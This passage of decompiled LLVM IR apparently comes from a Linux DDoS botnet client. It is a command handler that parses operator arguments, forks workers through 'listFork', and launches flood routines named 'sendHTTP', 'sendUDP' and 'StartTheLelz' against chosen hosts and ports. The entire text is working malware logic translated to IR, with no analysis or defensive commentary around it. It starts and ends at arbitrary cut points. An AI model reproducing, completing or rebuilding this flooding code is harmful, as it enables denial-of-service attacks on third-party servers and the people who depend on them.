  store i32 %v7_804c318, i32* %edx.global-to-local, align 4
  %v1_804c320 = trunc i32 %v7_804c318 to i8
  %v3_804c320 = zext i1 %v0_804c318 to i8
  %v15_804c320 = icmp eq i8 %v1_804c320, %v3_804c320
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c329 = icmp eq i1 %v15_804c320, false
  br i1 %v1_804c329, label %dec_label_pc_804c389, label %dec_label_pc_804c32b

dec_label_pc_804c32b:                             ; preds = %dec_label_pc_804c2e1
  %v0_804c32b = load i32, i32* @global_var_805e750.111, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c330 = icmp eq i32 %v0_804c32b, 0
  %v1_804c332 = icmp eq i1 %v1_804c330, false
  br i1 %v1_804c332, label %dec_label_pc_804cd02, label %dec_label_pc_804c338

dec_label_pc_804c338:                             ; preds = %dec_label_pc_804c32b
  %v1_804c338 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c34e = icmp eq i32 %v1_804c338, 0
  br i1 %v4_804c34e, label %dec_label_pc_804c36b, label %dec_label_pc_804c354

dec_label_pc_804c354:                             ; preds = %dec_label_pc_804c338
  store i32 %v1_804c338, i32* @global_var_805e750.111, align 16
  br label %dec_label_pc_804cd02

dec_label_pc_804c36b:                             ; preds = %dec_label_pc_804c338
  store i1 true, i1* %cf.global-to-local, align 1
  %v2_804c378 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_804c384 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c389:                             ; preds = %dec_label_pc_804c2e1, %dec_label_pc_804c220
  %v2_804c38c = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c3a9 = inttoptr i32 %v2_804c38c to i8*
  store i32 %v2_804c38c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805601c.113 to i32), i32* @edi, align 4
  %v7_804c3bb = call i32 @_strncmp(i8* %v4_804c3a9, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805601c.113, i32 0, i32 0), i32 5)
  %v8_804c3bb = urem i32 %v7_804c3bb, 2
  %v9_804c3bb = icmp eq i32 %v8_804c3bb, 0
  %v0_804c3bd = load i1, i1* %cf.global-to-local, align 1
  %v2_804c3bd = or i1 %v0_804c3bd, %v9_804c3bb
  %v3_804c3bd = zext i1 %v2_804c3bd to i32
  %v4_804c3bd = load i32, i32* %edx.global-to-local, align 4
  %v5_804c3bd = and i32 %v4_804c3bd, -256
  %v6_804c3bd = or i32 %v3_804c3bd, %v5_804c3bd
  %v7_804c3bd = xor i32 %v6_804c3bd, 1
  store i32 %v7_804c3bd, i32* @edx, align 4
  %v1_804c3c5 = trunc i32 %v7_804c3bd to i8
  %v3_804c3c5 = zext i1 %v0_804c3bd to i8
  %v4_804c3c5 = sub nsw i8 %v1_804c3c5, %v3_804c3c5
  %v15_804c3c5 = icmp eq i8 %v4_804c3c5, 0
  store i1 false, i1* @cf, align 1
  %v1_804c3ce = icmp eq i1 %v15_804c3c5, false
  br i1 %v1_804c3ce, label %dec_label_pc_804c4f3, label %dec_label_pc_804c3d4

dec_label_pc_804c3d4:                             ; preds = %dec_label_pc_804c389
  %v2_804c3c9 = sext i8 %v4_804c3c5 to i32
  %v9_804c3d4 = icmp ult i32 %arg1, 5
  store i1 %v9_804c3d4, i1* %cf.global-to-local, align 1
  %v7_804c3d8 = icmp sgt i32 %arg1, 5
  br i1 %v7_804c3d8, label %dec_label_pc_804c3de, label %dec_label_pc_804cd02

dec_label_pc_804c3de:                             ; preds = %dec_label_pc_804c3d4
  %v1_804c3e1 = add i32 %tmp119, 12
  %v5_804c3e1 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804c3e1, i1* %cf.global-to-local, align 1
  %v1_804c3e4 = inttoptr i32 %v1_804c3e1 to i32*
  %v2_804c3e4 = load i32, i32* %v1_804c3e4, align 4
  %v1_804c3e9 = call i32 @atol(i32 %v2_804c3e4)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp126 = icmp slt i32 %v1_804c3e9, 1
  br i1 %tmp126, label %dec_label_pc_804cd02, label %dec_label_pc_804c3f6

dec_label_pc_804c3f6:                             ; preds = %dec_label_pc_804c3de
  %v1_804c3f9 = add i32 %tmp119, 20
  %v5_804c3f9 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804c3f9, i1* %cf.global-to-local, align 1
  %v1_804c3fc = inttoptr i32 %v1_804c3f9 to i32*
  %v2_804c3fc = load i32, i32* %v1_804c3fc, align 4
  %v1_804c401 = call i32 @atol(i32 %v2_804c3fc)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp127 = icmp slt i32 %v1_804c401, 1
  %tmp128 = icmp eq i1 %tmp127, false
  br i1 %tmp128, label %dec_label_pc_804c40f, label %dec_label_pc_804cd02

dec_label_pc_804c40f:                             ; preds = %dec_label_pc_804c3f6
  %v0_804c40f = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c414 = icmp eq i32 %v0_804c40f, 0
  %v1_804c416 = icmp eq i1 %v1_804c414, false
  br i1 %v1_804c416, label %dec_label_pc_804cd02, label %dec_label_pc_804c41c

dec_label_pc_804c41c:                             ; preds = %dec_label_pc_804c40f
  store i1 %v5_804c3f9, i1* %cf.global-to-local, align 1
  %v2_804c422 = load i32, i32* %v1_804c3fc, align 4
  %v1_804c427 = call i32 @atol(i32 %v2_804c422)
  store i32 %v1_804c427, i32* @esi, align 4
  store i1 %v5_804c3e1, i1* %cf.global-to-local, align 1
  %v2_804c434 = load i32, i32* %v1_804c3e4, align 4
  %v1_804c439 = call i32 @atol(i32 %v2_804c434)
  store i32 %v1_804c439, i32* %edx.global-to-local, align 4
  %v1_804c443 = add i32 %tmp119, 8
  %v1_804c446 = inttoptr i32 %v1_804c443 to i32*
  %v2_804c446 = load i32, i32* %v1_804c446, align 4
  %v1_804c44b = add i32 %tmp119, 4
  %v5_804c44b = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804c44b, i1* %cf.global-to-local, align 1
  %v1_804c44e = inttoptr i32 %v1_804c44b to i32*
  %v2_804c44e = load i32, i32* %v1_804c44e, align 4
  %v0_804c450 = load i32, i32* @global_var_80584c0.18, align 64
  store i32 %v0_804c450, i32* @ebx, align 4
  %v4_804c471 = call i32 @Rootsprintf(i32 %v0_804c450, i32 ptrtoint ([38 x i8]* @global_var_8056024.114 to i32), i32 %v2_804c44e, i32 %v2_804c446)
  %v1_804c479 = add i32 %tmp119, 24
  %v5_804c479 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c479, i1* %cf.global-to-local, align 1
  %v1_804c47c = inttoptr i32 %v1_804c479 to i32*
  %v2_804c47c = load i32, i32* %v1_804c47c, align 4
  %v1_804c481 = call i32 @atol(i32 %v2_804c47c)
  store i32 %v1_804c481, i32* @ebx, align 4
  store i1 %v5_804c3f9, i1* %cf.global-to-local, align 1
  %v2_804c48e = load i32, i32* %v1_804c3fc, align 4
  %v1_804c493 = call i32 @atol(i32 %v2_804c48e)
  store i32 %v1_804c493, i32* @esi, align 4
  %v1_804c49d = add i32 %tmp119, 16
  %v1_804c4a0 = inttoptr i32 %v1_804c49d to i32*
  %v2_804c4a0 = load i32, i32* %v1_804c4a0, align 4
  store i32 %v2_804c4a0, i32* @edi, align 4
  store i1 %v5_804c3e1, i1* %cf.global-to-local, align 1
  %v2_804c4aa = load i32, i32* %v1_804c3e4, align 4
  %v1_804c4af = call i32 @atol(i32 %v2_804c4aa)
  %v1_804c4b4 = urem i32 %v1_804c4af, 65536
  store i32 %v1_804c4b4, i32* %edx.global-to-local, align 4
  %v2_804c4bf = load i32, i32* %v1_804c446, align 4
  store i1 %v5_804c44b, i1* %cf.global-to-local, align 1
  %v2_804c4c9 = load i32, i32* %v1_804c44e, align 4
  %v0_804c4cb = load i32, i32* @ebx, align 4
  %v0_804c4cf = load i32, i32* @esi, align 4
  %v0_804c4d3 = load i32, i32* @edi, align 4
  %v6_804c4e2 = trunc i32 %v1_804c4af to i16
  %v7_804c4e2 = call i32 @sendHTTP(i32 %v2_804c4c9, i32 %v2_804c4bf, i16 %v6_804c4e2, i32 %v0_804c4d3, i32 %v0_804c4cf, i32 %v0_804c4cb)
  store i32 %v7_804c4e2, i32* @eax, align 4
  %v1_804c4ee = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804c4f3

dec_label_pc_804c4f3:                             ; preds = %dec_label_pc_804c389, %dec_label_pc_804c41c
  %v2_804c4f6 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c513 = inttoptr i32 %v2_804c4f6 to i8*
  %v7_804c525 = call i32 @_strncmp(i8* %v4_804c513, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805604a.115, i32 0, i32 0), i32 4)
  %v8_804c525 = urem i32 %v7_804c525, 2
  %v9_804c525 = icmp eq i32 %v8_804c525, 0
  %v0_804c527 = load i1, i1* @cf, align 1
  %v2_804c527 = or i1 %v0_804c527, %v9_804c525
  %v3_804c527 = zext i1 %v2_804c527 to i32
  %v4_804c527 = load i32, i32* @edx, align 4
  %v5_804c527 = and i32 %v4_804c527, -256
  %v6_804c527 = or i32 %v3_804c527, %v5_804c527
  %v7_804c527 = xor i32 %v6_804c527, 1
  store i32 %v7_804c527, i32* %edx.global-to-local, align 4
  %v1_804c52f = trunc i32 %v7_804c527 to i8
  %v3_804c52f = zext i1 %v0_804c527 to i8
  %v4_804c52f = sub nsw i8 %v1_804c52f, %v3_804c52f
  %v15_804c52f = icmp eq i8 %v4_804c52f, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c538 = icmp eq i1 %v15_804c52f, false
  br i1 %v1_804c538, label %dec_label_pc_804c7ff, label %dec_label_pc_804c53e

dec_label_pc_804c53e:                             ; preds = %dec_label_pc_804c4f3
  %v2_804c533 = sext i8 %v4_804c52f to i32
  %v9_804c53e = icmp ult i32 %arg1, 5
  store i1 %v9_804c53e, i1* %cf.global-to-local, align 1
  %v7_804c542 = icmp sgt i32 %arg1, 5
  br i1 %v7_804c542, label %dec_label_pc_804c548, label %dec_label_pc_804cd02

dec_label_pc_804c548:                             ; preds = %dec_label_pc_804c53e
  %v1_804c54b = add i32 %tmp119, 12
  %v5_804c54b = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804c54b, i1* %cf.global-to-local, align 1
  %v1_804c54e = inttoptr i32 %v1_804c54b to i32*
  %v2_804c54e = load i32, i32* %v1_804c54e, align 4
  %v1_804c553 = call i32 @atol(i32 %v2_804c54e)
  %v5_804c558 = icmp ne i32 %v1_804c553, -1
  store i1 %v5_804c558, i1* %cf.global-to-local, align 1
  %v10_804c558 = icmp eq i32 %v1_804c553, -1
  br i1 %v10_804c558, label %dec_label_pc_804cd02, label %dec_label_pc_804c561

dec_label_pc_804c561:                             ; preds = %dec_label_pc_804c548
  %v1_804c564 = add i32 %tmp119, 8
  %v5_804c564 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804c564, i1* %cf.global-to-local, align 1
  %v1_804c567 = inttoptr i32 %v1_804c564 to i32*
  %v2_804c567 = load i32, i32* %v1_804c567, align 4
  %v1_804c56c = call i32 @atol(i32 %v2_804c567)
  %v5_804c571 = icmp ne i32 %v1_804c56c, -1
  store i1 %v5_804c571, i1* %cf.global-to-local, align 1
  %v10_804c571 = icmp eq i32 %v1_804c56c, -1
  br i1 %v10_804c571, label %dec_label_pc_804cd02, label %dec_label_pc_804c57a

dec_label_pc_804c57a:                             ; preds = %dec_label_pc_804c561
  %v1_804c57d = add i32 %tmp119, 16
  %v2_804c57d = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804c57d, i1* %cf.global-to-local, align 1
  %v1_804c580 = inttoptr i32 %v1_804c57d to i32*
  %v2_804c580 = load i32, i32* %v1_804c580, align 4
  %v1_804c585 = call i32 @atol(i32 %v2_804c580)
  %v5_804c58a = icmp ne i32 %v1_804c585, -1
  store i1 %v5_804c58a, i1* %cf.global-to-local, align 1
  %v10_804c58a = icmp eq i32 %v1_804c585, -1
  br i1 %v10_804c58a, label %dec_label_pc_804cd02, label %dec_label_pc_804c593

dec_label_pc_804c593:                             ; preds = %dec_label_pc_804c57a
  %v1_804c596 = add i32 %tmp119, 20
  %v5_804c596 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804c596, i1* %cf.global-to-local, align 1
  %v1_804c599 = inttoptr i32 %v1_804c596 to i32*
  %v2_804c599 = load i32, i32* %v1_804c599, align 4
  %v1_804c59e = call i32 @atol(i32 %v2_804c599)
  %v5_804c5a3 = icmp ne i32 %v1_804c59e, -1
  store i1 %v5_804c5a3, i1* %cf.global-to-local, align 1
  %v10_804c5a3 = icmp eq i32 %v1_804c59e, -1
  br i1 %v10_804c5a3, label %dec_label_pc_804cd02, label %dec_label_pc_804c5ac

dec_label_pc_804c5ac:                             ; preds = %dec_label_pc_804c593
  store i1 %v5_804c596, i1* %cf.global-to-local, align 1
  %v2_804c5b2 = load i32, i32* %v1_804c599, align 4
  %v1_804c5b7 = call i32 @atol(i32 %v2_804c5b2)
  %v1_804c5bc = add i32 %v1_804c5b7, -65536
  %v2_804c5bc = icmp ult i32 %v1_804c5b7, 65536
  %v3_804c5bc = sub i32 65535, %v1_804c5b7
  %v4_804c5bc = and i32 %v3_804c5bc, %v1_804c5b7
  %v5_804c5bc = icmp slt i32 %v4_804c5bc, 0
  store i1 %v2_804c5bc, i1* %cf.global-to-local, align 1
  %v6_804c5bc = icmp eq i32 %v1_804c5bc, 0
  %v7_804c5bc = icmp slt i32 %v1_804c5bc, 0
  %v3_804c5c1 = icmp eq i1 %v7_804c5bc, %v5_804c5bc
  %v4_804c5c1 = icmp eq i1 %v6_804c5bc, false
  %v5_804c5c1 = and i1 %v4_804c5c1, %v3_804c5c1
  br i1 %v5_804c5c1, label %dec_label_pc_804cd02, label %dec_label_pc_804c5c7

dec_label_pc_804c5c7:                             ; preds = %dec_label_pc_804c5ac
  store i1 %v5_804c596, i1* %cf.global-to-local, align 1
  %v2_804c5cd = load i32, i32* %v1_804c599, align 4
  %v1_804c5d2 = call i32 @atol(i32 %v2_804c5cd)
  %v1_804c5d7 = add i32 %v1_804c5d2, -65500
  %v5_804c5d7 = icmp ult i32 %v1_804c5d2, 65500
  %v6_804c5d7 = sub i32 65499, %v1_804c5d2
  %v7_804c5d7 = and i32 %v6_804c5d7, %v1_804c5d2
  %v8_804c5d7 = icmp slt i32 %v7_804c5d7, 0
  store i1 %v5_804c5d7, i1* %cf.global-to-local, align 1
  %v9_804c5d7 = icmp eq i32 %v1_804c5d7, 0
  %v10_804c5d7 = icmp slt i32 %v1_804c5d7, 0
  %v3_804c5dc = icmp eq i1 %v10_804c5d7, %v8_804c5d7
  %v4_804c5dc = icmp eq i1 %v9_804c5d7, false
  %v5_804c5dc = and i1 %v4_804c5dc, %v3_804c5dc
  br i1 %v5_804c5dc, label %dec_label_pc_804cd02, label %dec_label_pc_804c5e2

dec_label_pc_804c5e2:                             ; preds = %dec_label_pc_804c5c7
  store i1 %v2_804c57d, i1* %cf.global-to-local, align 1
  %v2_804c5e8 = load i32, i32* %v1_804c580, align 4
  %v1_804c5ed = call i32 @atol(i32 %v2_804c5e8)
  %v1_804c5f2 = add i32 %v1_804c5ed, -32
  %v2_804c5f2 = icmp ult i32 %v1_804c5ed, 32
  %v3_804c5f2 = sub i32 31, %v1_804c5ed
  %v4_804c5f2 = and i32 %v3_804c5f2, %v1_804c5ed
  %v5_804c5f2 = icmp slt i32 %v4_804c5f2, 0
  store i1 %v2_804c5f2, i1* %cf.global-to-local, align 1
  %v6_804c5f2 = icmp eq i32 %v1_804c5f2, 0
  %v7_804c5f2 = icmp slt i32 %v1_804c5f2, 0
  %v3_804c5f5 = icmp eq i1 %v7_804c5f2, %v5_804c5f2
  %v4_804c5f5 = icmp eq i1 %v6_804c5f2, false
  %v5_804c5f5 = and i1 %v4_804c5f5, %v3_804c5f5
  br i1 %v5_804c5f5, label %dec_label_pc_804cd02, label %dec_label_pc_804c5fb

dec_label_pc_804c5fb:                             ; preds = %dec_label_pc_804c5e2
  %v8_804c5fb = icmp ult i32 %arg1, 7
  store i1 %v8_804c5fb, i1* %cf.global-to-local, align 1
  %v12_804c5fb = icmp eq i32 %arg1, 7
  %v1_804c5ff = icmp eq i1 %v12_804c5fb, false
  br i1 %v1_804c5ff, label %dec_label_pc_804c61a, label %dec_label_pc_804c601

dec_label_pc_804c601:                             ; preds = %dec_label_pc_804c5fb
  %v1_804c604 = add i32 %tmp119, 24
  %v5_804c604 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c604, i1* %cf.global-to-local, align 1
  %v1_804c607 = inttoptr i32 %v1_804c604 to i32*
  %v2_804c607 = load i32, i32* %v1_804c607, align 4
  %v1_804c60c = call i32 @atol(i32 %v2_804c607)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp129 = icmp slt i32 %v1_804c60c, 1
  %tmp130 = icmp eq i1 %tmp129, false
  br i1 %tmp130, label %dec_label_pc_804c61a, label %dec_label_pc_804cd02

dec_label_pc_804c61a:                             ; preds = %dec_label_pc_804c601, %dec_label_pc_804c5fb
  %v1_804c61d = add i32 %tmp119, 4
  %v1_804c620 = inttoptr i32 %v1_804c61d to i32*
  %v2_804c620 = load i32, i32* %v1_804c620, align 4
  store i1 %v5_804c564, i1* %cf.global-to-local, align 1
  %v2_804c62b = load i32, i32* %v1_804c567, align 4
  %v1_804c630 = call i32 @atol(i32 %v2_804c62b)
  store i1 %v5_804c54b, i1* %cf.global-to-local, align 1
  %v2_804c63e = load i32, i32* %v1_804c54e, align 4
  %v1_804c643 = call i32 @atol(i32 %v2_804c63e)
  store i1 %v2_804c57d, i1* %cf.global-to-local, align 1
  %v2_804c651 = load i32, i32* %v1_804c580, align 4
  %v1_804c656 = call i32 @atol(i32 %v2_804c651)
  store i1 %v5_804c596, i1* %cf.global-to-local, align 1
  %v2_804c664 = load i32, i32* %v1_804c599, align 4
  %v1_804c669 = call i32 @atol(i32 %v2_804c664)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c675 = icmp sgt i32 %arg1, 6
  br i1 %v7_804c675, label %dec_label_pc_804c699, label %dec_label_pc_804c699.thread

dec_label_pc_804c699.thread:                      ; preds = %dec_label_pc_804c61a
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804c5fb, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c6ca

dec_label_pc_804c699:                             ; preds = %dec_label_pc_804c61a
  %v1_804c67a = add i32 %tmp119, 24
  %v5_804c67a = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c67a, i1* %cf.global-to-local, align 1
  %v1_804c67d = inttoptr i32 %v1_804c67a to i32*
  %v2_804c67d = load i32, i32* %v1_804c67d, align 4
  %v1_804c682 = call i32 @atol(i32 %v2_804c67d)
  store i32 %v1_804c682, i32* @esi, align 4
  store i1 %v8_804c5fb, i1* %cf.global-to-local, align 1
  %v7_804c6a6 = icmp eq i32 %arg1, 7
  br i1 %v7_804c6a6, label %dec_label_pc_804c6ca, label %dec_label_pc_804c6a8

dec_label_pc_804c6a8:                             ; preds = %dec_label_pc_804c699
  %v1_804c6ab = add i32 %tmp119, 28
  %v5_804c6ab = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804c6ab, i1* %cf.global-to-local, align 1
  %v1_804c6ae = inttoptr i32 %v1_804c6ab to i32*
  %v2_804c6ae = load i32, i32* %v1_804c6ae, align 4
  %v1_804c6b3 = call i32 @atol(i32 %v2_804c6ae)
  br label %dec_label_pc_804c6ca

dec_label_pc_804c6ca:                             ; preds = %dec_label_pc_804c699, %dec_label_pc_804c699.thread, %dec_label_pc_804c6a8
  %storemerge8137 = phi i32 [ %v1_804c682, %dec_label_pc_804c6a8 ], [ %v1_804c682, %dec_label_pc_804c699 ], [ 1000, %dec_label_pc_804c699.thread ]
  %storemerge7 = phi i32 [ %v1_804c6b3, %dec_label_pc_804c6a8 ], [ 1000000, %dec_label_pc_804c699 ], [ 1000000, %dec_label_pc_804c699.thread ]
  store i32 %storemerge7, i32* @edi, align 4
  %v9_804c6d3 = icmp ult i32 %arg1, 8
  store i1 %v9_804c6d3, i1* %cf.global-to-local, align 1
  %v7_804c6d7 = icmp sgt i32 %arg1, 8
  br i1 %v7_804c6d7, label %dec_label_pc_804c6d9, label %dec_label_pc_804c6fb

dec_label_pc_804c6d9:                             ; preds = %dec_label_pc_804c6ca
  %v1_804c6dc = add i32 %tmp119, 32
  %v2_804c6dc = icmp ugt i32* %arg2, inttoptr (i32 -33 to i32*)
  store i1 %v2_804c6dc, i1* %cf.global-to-local, align 1
  %v1_804c6df = inttoptr i32 %v1_804c6dc to i32*
  %v2_804c6df = load i32, i32* %v1_804c6df, align 4
  %v1_804c6e4 = call i32 @atol(i32 %v2_804c6df)
  %phitmp = sext i32 %v1_804c6e4 to i64
  br label %dec_label_pc_804c6fb

dec_label_pc_804c6fb:                             ; preds = %dec_label_pc_804c6ca, %dec_label_pc_804c6d9
  %storemerge6 = phi i64 [ %phitmp, %dec_label_pc_804c6d9 ], [ 0, %dec_label_pc_804c6ca ]
  %v2_804c712 = inttoptr i32 %v2_804c620 to i8*
  %v3_804c712 = call i32 @__GI_strchr(i8* %v2_804c712, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c717 = icmp eq i32 %v3_804c712, 0
  br i1 %v1_804c717, label %dec_label_pc_804c7aa, label %dec_label_pc_804c71f

dec_label_pc_804c71f:                             ; preds = %dec_label_pc_804c6fb
  store i32 %v2_804c620, i32* @eax, align 4
  %v2_804c72d = call i32 @__GI_strtok(i32 %v2_804c620, i32 ptrtoint (i32* @global_var_8055ff4.102 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c79f34 = icmp eq i32 %v2_804c72d, 0
  %v1_804c7a341 = icmp eq i1 %v4_804c79f34, false
  br i1 %v1_804c7a341, label %dec_label_pc_804c737, label %dec_label_pc_804cd02

dec_label_pc_804c737:                             ; preds = %dec_label_pc_804c71f, %dec_label_pc_804c788
  %storemerge942 = phi i32 [ %v2_804c797, %dec_label_pc_804c788 ], [ %v2_804c72d, %dec_label_pc_804c71f ]
  %v0_804c737 = call i32 @listFork()
  store i32 %v0_804c737, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c73c = icmp eq i32 %v0_804c737, 0
  %v1_804c73e = icmp eq i1 %v1_804c73c, false
  br i1 %v1_804c73e, label %dec_label_pc_804c788, label %dec_label_pc_804c740

dec_label_pc_804c740:                             ; preds = %dec_label_pc_804c737
  %v9_804c777 = call i32 @sendUDP(i32 %storemerge942, i32 %v1_804c630, i32 %v1_804c643, i32 %v1_804c656, i32 %v1_804c669, i32 %storemerge8137, i32 %storemerge7, i64 %storemerge6)
  %v1_804c783 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c788:                             ; preds = %dec_label_pc_804c737
  %v2_804c797 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8055ff4.102 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c79f = icmp eq i32 %v2_804c797, 0
  %v1_804c7a3 = icmp eq i1 %v4_804c79f, false
  br i1 %v1_804c7a3, label %dec_label_pc_804c737, label %dec_label_pc_804cd02

dec_label_pc_804c7aa:                             ; preds = %dec_label_pc_804c6fb
  %v0_804c7aa = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c7af = icmp eq i32 %v0_804c7aa, 0
  %v1_804c7b1 = icmp eq i1 %v1_804c7af, false
  br i1 %v1_804c7b1, label %dec_label_pc_804cd02, label %dec_label_pc_804c7b7

dec_label_pc_804c7b7:                             ; preds = %dec_label_pc_804c7aa
  %v9_804c7ee = call i32 @sendUDP(i32 %v2_804c620, i32 %v1_804c630, i32 %v1_804c643, i32 %v1_804c656, i32 %v1_804c669, i32 %storemerge8137, i32 %storemerge7, i64 %storemerge6)
  %v1_804c7fa = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c7ff:                             ; preds = %dec_label_pc_804c4f3
  %v2_804c802 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c81f = inttoptr i32 %v2_804c802 to i8*
  %v7_804c831 = call i32 @_strncmp(i8* %v4_804c81f, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805604e.116, i32 0, i32 0), i32 4)
  %v8_804c831 = urem i32 %v7_804c831, 2
  %v9_804c831 = icmp eq i32 %v8_804c831, 0
  %v0_804c833 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c833 = or i1 %v0_804c833, %v9_804c831
  %v3_804c833 = zext i1 %v2_804c833 to i32
  %v4_804c833 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c833 = and i32 %v4_804c833, -256
  %v6_804c833 = or i32 %v3_804c833, %v5_804c833
  %v7_804c833 = xor i32 %v6_804c833, 1
  store i32 %v7_804c833, i32* @edx, align 4
  %v1_804c83b = trunc i32 %v7_804c833 to i8
  %v3_804c83b = zext i1 %v0_804c833 to i8
  %v4_804c83b = sub nsw i8 %v1_804c83b, %v3_804c83b
  %v15_804c83b = icmp eq i8 %v4_804c83b, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c844 = icmp eq i1 %v15_804c83b, false
  br i1 %v1_804c844, label %dec_label_pc_804ca8c, label %dec_label_pc_804c84a

dec_label_pc_804c84a:                             ; preds = %dec_label_pc_804c7ff
  %v2_804c83f = sext i8 %v4_804c83b to i32
  %v9_804c84a = icmp ult i32 %arg1, 5
  store i1 %v9_804c84a, i1* %cf.global-to-local, align 1
  %v7_804c84e = icmp sgt i32 %arg1, 5
  br i1 %v7_804c84e, label %dec_label_pc_804c854, label %dec_label_pc_804cd02

dec_label_pc_804c854:                             ; preds = %dec_label_pc_804c84a
  %v1_804c857 = add i32 %tmp119, 12
  %v5_804c857 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804c857, i1* %cf.global-to-local, align 1
  %v1_804c85a = inttoptr i32 %v1_804c857 to i32*
  %v2_804c85a = load i32, i32* %v1_804c85a, align 4
  %v1_804c85f = call i32 @atol(i32 %v2_804c85a)
  %v5_804c864 = icmp ne i32 %v1_804c85f, -1
  store i1 %v5_804c864, i1* %cf.global-to-local, align 1
  %v10_804c864 = icmp eq i32 %v1_804c85f, -1
  br i1 %v10_804c864, label %dec_label_pc_804cd02, label %dec_label_pc_804c86d

dec_label_pc_804c86d:                             ; preds = %dec_label_pc_804c854
  %v1_804c870 = add i32 %tmp119, 8
  %v5_804c870 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804c870, i1* %cf.global-to-local, align 1
  %v1_804c873 = inttoptr i32 %v1_804c870 to i32*
  %v2_804c873 = load i32, i32* %v1_804c873, align 4
  %v1_804c878 = call i32 @atol(i32 %v2_804c873)
  %v5_804c87d = icmp ne i32 %v1_804c878, -1
  store i1 %v5_804c87d, i1* %cf.global-to-local, align 1
  %v10_804c87d = icmp eq i32 %v1_804c878, -1
  br i1 %v10_804c87d, label %dec_label_pc_804cd02, label %dec_label_pc_804c886

dec_label_pc_804c886:                             ; preds = %dec_label_pc_804c86d
  %v1_804c889 = add i32 %tmp119, 16
  %v2_804c889 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804c889, i1* %cf.global-to-local, align 1
  %v1_804c88c = inttoptr i32 %v1_804c889 to i32*
  %v2_804c88c = load i32, i32* %v1_804c88c, align 4
  %v1_804c891 = call i32 @atol(i32 %v2_804c88c)
  %v5_804c896 = icmp ne i32 %v1_804c891, -1
  store i1 %v5_804c896, i1* %cf.global-to-local, align 1
  %v10_804c896 = icmp eq i32 %v1_804c891, -1
  br i1 %v10_804c896, label %dec_label_pc_804cd02, label %dec_label_pc_804c89f

dec_label_pc_804c89f:                             ; preds = %dec_label_pc_804c886
  store i1 %v2_804c889, i1* %cf.global-to-local, align 1
  %v2_804c8a5 = load i32, i32* %v1_804c88c, align 4
  %v1_804c8aa = call i32 @atol(i32 %v2_804c8a5)
  %v1_804c8af = add i32 %v1_804c8aa, -32
  %v2_804c8af = icmp ult i32 %v1_804c8aa, 32
  %v3_804c8af = sub i32 31, %v1_804c8aa
  %v4_804c8af = and i32 %v3_804c8af, %v1_804c8aa
  %v5_804c8af = icmp slt i32 %v4_804c8af, 0
  store i1 %v2_804c8af, i1* %cf.global-to-local, align 1
  %v6_804c8af = icmp eq i32 %v1_804c8af, 0
  %v7_804c8af = icmp slt i32 %v1_804c8af, 0
  %v3_804c8b2 = icmp eq i1 %v7_804c8af, %v5_804c8af
  %v4_804c8b2 = icmp eq i1 %v6_804c8af, false
  %v5_804c8b2 = and i1 %v4_804c8b2, %v3_804c8b2
  br i1 %v5_804c8b2, label %dec_label_pc_804cd02, label %dec_label_pc_804c8b8

dec_label_pc_804c8b8:                             ; preds = %dec_label_pc_804c89f
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c8bc = icmp sgt i32 %arg1, 6
  br i1 %v7_804c8bc, label %dec_label_pc_804c8be, label %dec_label_pc_804c8d6

dec_label_pc_804c8be:                             ; preds = %dec_label_pc_804c8b8
  %v1_804c8c1 = add i32 %tmp119, 24
  %v5_804c8c1 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
